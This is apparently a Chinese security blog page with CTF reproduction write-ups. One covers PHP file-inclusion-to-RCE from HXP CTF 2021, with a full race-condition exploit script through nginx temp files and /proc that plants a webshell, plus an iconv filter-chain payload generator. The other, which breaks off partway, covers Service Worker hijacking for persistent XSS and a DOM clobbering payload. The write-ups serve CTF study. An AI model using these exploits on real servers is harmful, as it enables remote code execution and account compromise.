<p>​    利用<code>Nginx</code>提供了一个客户端主体缓冲区，如果客户端主体信息超过了某个阈值的话，<code>Nginx</code>会将全部主体或者部分主体写入到一个临时文件里面。如果<code>Nginx</code>和<code>PHP</code>以相同的用户身份进行运行的话，就可以利用此方式来上传文件，从而达到<code>RCE</code>的目的。</p>
<p>​    官方解释：<code>https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Syntax:	client_body_buffer_size size;</span><br><span class="line">Default:	client_body_buffer_size 8k|16k;</span><br><span class="line">Context:	http, server, location</span><br><span class="line"></span><br><span class="line">Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.</span><br></pre></td></tr></table></figure>

<p>​    相关的<code>Nginx</code>的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)</span><br><span class="line">&#123;</span><br><span class="line">    ngx_fd_t  fd;</span><br><span class="line"></span><br><span class="line">    fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,</span><br><span class="line">              access ? access : 0600);</span><br><span class="line"></span><br><span class="line">    if (fd != -1 &amp;&amp; !persistent) &#123;</span><br><span class="line">        (void) unlink((const char *) name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    可以发现<code>open</code>了一个文件，然后利用<code>unlink</code>又将文件删除掉。所以，这里存在一个利用方式就是条件竞争。在<code>Linux</code>环境下，我们可以利用<code>procfs</code>来获取一个已被删除文件的引用。</p>
<p>​    在<code>PHP</code>环境下，利用<code>include</code>函数直接包含<code>/proc/23/fd</code>这种文件，会显示解析的文件不存在路径中，可以利用<code>/proc/self/fd/23/../../../23/fd/</code>这种方式来进行绕过。</p>
<p>​    <code>poc.py</code>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import sys, threading, requests</span><br><span class="line"></span><br><span class="line"># exploit PHP local file inclusion (LFI) via nginx assistance (client body buffering)</span><br><span class="line"># see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details</span><br><span class="line"></span><br><span class="line">URL = f&#x27;http://&#123;sys.argv[1]&#125;:&#123;sys.argv[2]&#125;/&#x27;</span><br><span class="line"></span><br><span class="line"># find nginx worker processes</span><br><span class="line">r  = requests.get(URL, params=&#123;</span><br><span class="line">    &#x27;file&#x27;: &#x27;/proc/cpuinfo&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">cpus = r.text.count(&#x27;processor&#x27;)</span><br><span class="line"></span><br><span class="line">r  = requests.get(URL, params=&#123;</span><br><span class="line">    &#x27;file&#x27;: &#x27;/proc/sys/kernel/pid_max&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">pid_max = int(r.text)</span><br><span class="line">print(f&#x27;[*] cpus: &#123;cpus&#125;; pid_max: &#123;pid_max&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">nginx_workers = []</span><br><span class="line">for pid in range(pid_max):</span><br><span class="line">    r  = requests.get(URL, params=&#123;</span><br><span class="line">        &#x27;file&#x27;: f&#x27;/proc/&#123;pid&#125;/cmdline&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    if b&#x27;nginx: worker process&#x27; in r.content:</span><br><span class="line">        print(f&#x27;[*] nginx worker found: &#123;pid&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">        nginx_workers.append(pid)</span><br><span class="line">        if len(nginx_workers) &gt;= cpus:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">done = False</span><br><span class="line"></span><br><span class="line"># upload a big client body to force nginx to create a /var/lib/nginx/body/$X</span><br><span class="line">def uploader():</span><br><span class="line">    print(&#x27;[+] starting uploader&#x27;)</span><br><span class="line">    while not done:</span><br><span class="line">        requests.get(URL, data=&#x27;&lt;?php system($_GET[&quot;c&quot;]); /*&#x27; + 16*1024*&#x27;A&#x27;)</span><br><span class="line"></span><br><span class="line">for _ in range(16):</span><br><span class="line">    t = threading.Thread(target=uploader)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"># brute force nginx&#x27;s fds to include body files via procfs</span><br><span class="line"># use ../../ to bypass include&#x27;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`</span><br><span class="line">def bruter(pid):</span><br><span class="line">    global done</span><br><span class="line"></span><br><span class="line">    while not done:</span><br><span class="line">        print(f&#x27;[+] brute loop restarted: &#123;pid&#125;&#x27;)</span><br><span class="line">        for fd in range(4, 32):</span><br><span class="line">            f = f&#x27;/proc/self/fd/&#123;pid&#125;/../../../&#123;pid&#125;/fd/&#123;fd&#125;&#x27;</span><br><span class="line">            r  = requests.get(URL, params=&#123;</span><br><span class="line">                &#x27;file&#x27;: f,</span><br><span class="line">                &#x27;c&#x27;: f&#x27;id&#x27;</span><br><span class="line">            &#125;)</span><br><span class="line">            if r.text:</span><br><span class="line">                print(f&#x27;[!] &#123;f&#125;: &#123;r.text&#125;&#x27;)</span><br><span class="line">                done = True</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">for pid in nginx_workers:</span><br><span class="line">    a = threading.Thread(target=bruter, args=(pid, ))</span><br><span class="line">    a.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>![image-20220105144508328](HXP CTF 2021 文件包含赛题复现.assets/image-20220105144508328.png)</p>
<h2 id="Trick-2：iconv编码转换利用"><a href="#Trick-2：iconv编码转换利用" class="headerlink" title="Trick 2：iconv编码转换利用"></a>Trick 2：<code>iconv</code>编码转换利用</h2><p>​    除了直接使用上面的方式进行利用以外，还可以考虑利用伪协议的方式进行利用。在<code>PHP filter</code>过滤器中，有<code>iconv</code>的一个过滤器，它可以将数据从一种编码转换到另外一种编码，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;php://filter/convert.iconv.UTF-8.UTF-7/resource=data:,asdasda&lt;&gt;asd&quot;;</span><br><span class="line">echo file_get_contents($url);</span><br></pre></td></tr></table></figure>

<p>​        在<code>Linux</code>环境下，我们可以通过<code>iconv -l</code>命令来查看支持的字符集。</p>
<p>![image-20220107093125710](HXP CTF 2021 文件包含赛题复现.assets/image-20220107093125710.png)</p>
<p>​    其中有一个特殊的编码<code>UTF8.CSISO2022KR</code>，他几乎可以在任何一个字符串前面都增加一串前缀<code>.$)C</code>，例如下面这个示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;php://filter/&quot;;</span><br><span class="line">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class="line">$url .= &quot;|convert.base64-decode|convert.base64-encode&quot;;</span><br><span class="line">$url .= &quot;/resource=data://,aaa&quot;;</span><br><span class="line">var_dump(file_get_contents($url));</span><br></pre></td></tr></table></figure>

<p>​    输出的结果为<code>Caaaa</code>，稍微解释一下就是<code>base64-decode</code>会去除掉不合法的字符（不合法是相对<code>base64</code>编码来说的），当我们通过<code>iconv</code>转码之后，会变成有<code>.$)Caaaa</code>，然后利用<code>base64-decode</code>除掉前面三个不合法字符，再<code>encode</code>一下，就看获取到<code>Caaaa</code>。</p>
<p>​    利用这种方式来进行<code>RCE</code>的一个思路就是利用不同的编码组合和<code>base64-decode</code>的特性，来构造一串恶意字符。下面贴一个<code>payload</code>脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;</span><br><span class="line">$conversions = array(</span><br><span class="line">    &#x27;R&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;,</span><br><span class="line">    &#x27;B&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;,</span><br><span class="line">    &#x27;C&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;,</span><br><span class="line">    &#x27;8&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class="line">    &#x27;9&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;,</span><br><span class="line">    &#x27;f&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;,</span><br><span class="line">    &#x27;s&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;,</span><br><span class="line">    &#x27;z&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;,</span><br><span class="line">    &#x27;U&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;,</span><br><span class="line">    &#x27;P&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;,</span><br><span class="line">    &#x27;V&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;,</span><br><span class="line">    &#x27;0&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;,</span><br><span class="line">    &#x27;Y&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;,</span><br><span class="line">    &#x27;W&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;,</span><br><span class="line">    &#x27;d&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;,</span><br><span class="line">    &#x27;D&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;,</span><br><span class="line">    &#x27;7&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;,</span><br><span class="line">    &#x27;4&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$filters = &quot;convert.base64-encode|&quot;;</span><br><span class="line"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="line">$filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class="line"></span><br><span class="line">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class="line">    $filters .= $conversions[$c] . &quot;|&quot;;</span><br><span class="line">    $filters .= &quot;convert.base64-decode|&quot;;</span><br><span class="line">    $filters .= &quot;convert.base64-encode|&quot;;</span><br><span class="line">    $filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$filters .= &quot;convert.base64-decode&quot;;</span><br><span class="line"></span><br><span class="line">$final_payload = &quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaa&quot;;</span><br><span class="line"></span><br><span class="line">// echo $final_payload;</span><br><span class="line">var_dump(file_get_contents($final_payload));</span><br></pre></td></tr></table></figure>

<p>​    仔细看一下脚本内容，可以发现我们是从后往前进行解析的，通过不断地拼接，<code>decode</code>最后就可以构造恶意<code>payload</code>。</p>
<p>​    但是该方式存在一定的局限性，我在两台不同的<code>Linux</code>主机上进行尝试，都没有成功。这应该是编码的问题，下面有师傅写的<code>fuzz</code>脚本，建议在利用这个技巧的时候，在与目标相同环境下，运行一下<code>fuzz</code>脚本，来获取特定的组合：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/fuzzer.php">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/fuzzer.php</a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">https://bierbaumer.net/security/php-lfi-with-nginx-assistance/</a></p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
<p><a target="_blank" rel="noopener" href="https://gynvael.coldwind.pl/?id=671">https://gynvael.coldwind.pl/?id=671</a></p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/01/07/HXP%20CTF%202021%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B0RCE%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/" data-id="cl8h2gj910001fgdp2dph8fmv" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-前端安全---湖湘杯2021-Pastebin复现学习" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---%E6%B9%96%E6%B9%98%E6%9D%AF2021-Pastebin%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2021-12-23T03:38:34.000Z" itemprop="datePublished">2021-12-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---%E6%B9%96%E6%B9%98%E6%9D%AF2021-Pastebin%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/">前端安全---湖湘杯2021-Pastebin复现学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前端安全—湖湘杯2021-Pastebin复现学习"><a href="#前端安全—湖湘杯2021-Pastebin复现学习" class="headerlink" title="前端安全—湖湘杯2021-Pastebin复现学习"></a>前端安全—湖湘杯2021-Pastebin复现学习</h1><h2 id="一、Service-Worker介绍"><a href="#一、Service-Worker介绍" class="headerlink" title="一、Service Worker介绍"></a>一、<code>Service Worker</code>介绍</h2><p>​    <code>Service Worker</code>可以理解为客户端与服务器之间的一个代理服务器。当网站中注册了<code>Service Worker</code>，那么它就可以拦截请求，根据开发者定义的程序，来判断是将请求传送给服务端还是直接通过缓存返回给客户端。</p>
<p>​    下面简单来实现一下<code>Service Worker</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># index.html</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        if(&#x27;serviceWorker&#x27; in navigator)&#123;</span><br><span class="line">            window.addEventListener(&#x27;load&#x27;,function()&#123;</span><br><span class="line">                navigator.serviceWorker.register(&#x27;./ws.js&#x27;,&#123;scope: &#x27;./&#x27;&#125;)</span><br><span class="line">                .then(function (registration) &#123;</span><br><span class="line">                    console.log(&#x27;serviceWorker registered&#x27;)</span><br><span class="line">                  &#125;)</span><br><span class="line">                .catch(function (err) &#123;</span><br><span class="line">                    console.log(&#x27;serviceWorker regist failed&#x27;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    简单解释一下代码：首先判断浏览器是否支持<code>Service Worker</code>，然后创建一个<code>Service Worker</code>，并指定其执行的代码以及作用域<code>scope</code>，该作用域表示的内容为拦截指定目录下的所有请求。创建成功之后，会执行<code>then</code>，否则执行<code>catch</code>。</p>
<p>​    在创建<code>Service Worker</code>的时候，指定了运行代码，既可以通过文件的形式指定，也可以直接通过代码的形式执行。接下来我们在<code>ws.js</code>中定义缓存规则代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">this.addEventListener(&#x27;install&#x27;,function(event)&#123;</span><br><span class="line">    event.waitUntil(</span><br><span class="line">        caches.open(&#x27;m1sn0w&#x27;).then(function (cache) &#123; </span><br><span class="line">            return cache.addAll([</span><br><span class="line">                &#x27;./index.html&#x27;</span><br><span class="line">            ])</span><br><span class="line">         &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">this.addEventListener(&#x27;fetch&#x27;,function (event) &#123;</span><br><span class="line">    event.respondWith(</span><br><span class="line">        new Response(&#x27;m1sn0w&#x27;,&#123;headers: &#123;&#x27;Content-Type&#x27;:&#x27;text/html&#x27;&#125;&#125;)</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>​    这个文件中定义了两个事件，一个是<code>install</code>事件，另外一个是<code>fetch</code>事件，<code>install</code>事件一般用来设置浏览器的缓存逻辑，可以指定要缓存的资源路径文件，而<code>fetch</code>事件是拦截请求后所作的动作，例如上面直接页面，内容为<code>m1sn0w</code>。在后续的<code>XSS</code>持久化利用中，主要使用到<code>fetch</code>这个事件。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221132704453.png" alt="image-20211221132704453"></p>
<h2 id="二、劫持Service-Worker"><a href="#二、劫持Service-Worker" class="headerlink" title="二、劫持Service Worker"></a>二、劫持<code>Service Worker</code></h2><p>​    假设存在一个反射型<code>XSS</code>漏洞利用点，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;./index.php&quot; method=&quot;POST&quot; &gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;xss&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        if(isset($_POST[&#x27;xss&#x27;]))&#123;</span><br><span class="line">            echo $_POST[&#x27;xss&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    如果想要劫持<code>Service Worker</code>的话，还需要一个条件，就是同域环境下需要一个<code>jsonp</code>，因为在后续构造<code>fetch</code>事件的时候，需要这个<code>jsonp</code>来将构造的代码返回，从而被当作执行的代码，例如，我在同域环境下给出一个<code>jsonp</code>（其实只需要能返回<code>GET</code>请求的数据就行）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># evil.js</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&#x27;Content-type: text/javascript&#x27;);</span><br><span class="line">    $callback=$_GET[&#x27;callback&#x27;];</span><br><span class="line">    echo $callback;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>​    这里需要返回头部信息为<code>text/javascript</code>，因为我们需要返回回来的代码被当作<code>JS</code>处理。然后我们构造如下<code>Payload</code>，并指定了缓存路径为<code>./m1sn0w/</code>，通过<code>POST</code>提交上去：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">navigator.serviceWorker.register(&#x27;./evil.php?callback=onfetch=function(e)&#123;console.log(1);e.respondWith(new Response(&quot;m1sn0w&quot;,&#123;headers: &#123;&quot;Content-Type&quot;:&quot;text/html&quot;&#125;&#125;))&#125;&#x27;,&#123;scope: &#x27;./m1sn0w/&#x27;&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    之后我访问<code>/m1sn0w/</code>目录下的任何文件，都会返回<code>m1sn0w</code>字符。（不管文件是否存在）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221141856042.png" alt="image-20211221141856042"></p>
<h2 id="三、湖湘杯Pastebin"><a href="#三、湖湘杯Pastebin" class="headerlink" title="三、湖湘杯Pastebin"></a>三、湖湘杯<code>Pastebin</code></h2><p>​    这里只探究一下涉及到的两个前端知识点，一个是<code>DOM Clobbering</code>，另外一个就是污染<code>Service Worker</code>来持久化<code>XSS</code>。</p>
<h3 id="1、DOM-Clobbering绕过检验函数"><a href="#1、DOM-Clobbering绕过检验函数" class="headerlink" title="1、DOM Clobbering绕过检验函数"></a>1、<code>DOM Clobbering</code>绕过检验函数</h3><p>​    首先是第一个漏洞，<code>DOM Clobbering</code>，我们根据<code>payload</code>去调试分析一下整条链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># payload</span><br><span class="line">&lt;form&gt;&lt;input name=removeChild&gt;&lt;/form&gt;&lt;img src=x onerror=alert(1337)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221163007863.png" alt="image-20211221163007863"></p>
<p>​    在此之前，简单分析一下前端校验代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">async function do_things(id) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        var html = await get(id);</span><br><span class="line">        var doc = new DOMParser().parseFromString(html, &quot;text/html&quot;);</span><br><span class="line">        if(doc.querySelectorAll(&quot;math&quot;).length !== 0 || doc.querySelectorAll(&quot;svg&quot;).length !== 0 || doc.querySelectorAll(&quot;base&quot;).length !== 0 || doc.querySelectorAll(&quot;object&quot;).length !== 0)&#123;</span><br><span class="line">            console.log(&quot;filtered&quot;);</span><br><span class="line">            return &quot;&lt;b&gt;Your paste have been filtered&lt;/b&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        html = safepaste.sanitize(html);</span><br><span class="line">    &#125; catch(e) &#123;</span><br><span class="line">        // fetch failed</span><br><span class="line">        console.log(e)</span><br><span class="line">    &#125;</span><br><span class="line">    return html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这里用到<code>try...catch</code>语句，但是在<code>catch</code>语句中并没有将程序结束，也就是说<code>catch</code>之后，程序还是会返回<code>html</code>变量。所以这里的思路就是在<code>try</code>语句块中触发报错，从而逃过<code>sanitize</code>函数的检查。经过上下文分析，可以知道<code>html</code>变量是受我们控制的。</p>
